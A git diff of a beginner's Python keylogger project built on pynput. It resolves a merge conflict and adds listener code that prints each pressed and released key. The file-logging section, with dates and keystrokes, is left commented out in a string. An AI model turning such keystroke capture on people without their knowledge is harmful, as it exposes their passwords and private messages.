@@ -1,40 +1,36 @@
 """
     Creating a key logging program.
-
     The goal is to log key strokes with the date and time for each sentence.
-
 """
-<<<<<<< HEAD
-
 from pynput import keyboard
-=======
 import keyboard as key
->>>>>>> 24f15f2bc47e08a91518e0fb4c8433addc95d3b5
 import numpy as np
 from datetime import datetime as t
-
+#%-----------------------------------------------------------------------------
 # Listens to the key inputs from the keyboard
 def on_press(key):
     try:
-        print('alphanumeric key {0} pressed'.format(
-            key.char))
+        print('alphanumeric key {0} pressed'.format(key.char))
     except AttributeError:
-        print('special key {0} pressed'.format(
-            key))
-        #  
+        print('special key {0} pressed'.format(key))
+#%-----------------------------------------------------------------------------
+# Marks down keys once released
 def on_release(key):
-    print('{0} released'.format(
-        key))
+    print('{0} released'.format(key))
     if key == keyboard.Key.esc:
         # Stop listener
         return False
-    
 
-
-
-
-
-
+#%-----------------------------------------------------------------------------  
+# Collect events until released
+with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
+    listener.join()
+#%-----------------------------------------------------------------------------
+# ...or, in a non-blocking fashion:
+listener = keyboard.Listener(on_press=on_press, on_release=on_release)
+listener.start()
+#%-----------------------------------------------------------------------------
+"""    
 # For Linux Directory
 with open("/home/bladerunner/Documents/python/keylogger/log.txt",'a') as logging:
 # For Windows Directory
@@ -51,6 +47,4 @@ with open("/home/bladerunner/Documents/python/keylogger/log.txt",'a') as logging
     logging.write(current_dt)
     logging.write("First line contains")
     logging.write("\n")
-
-
-
+"""
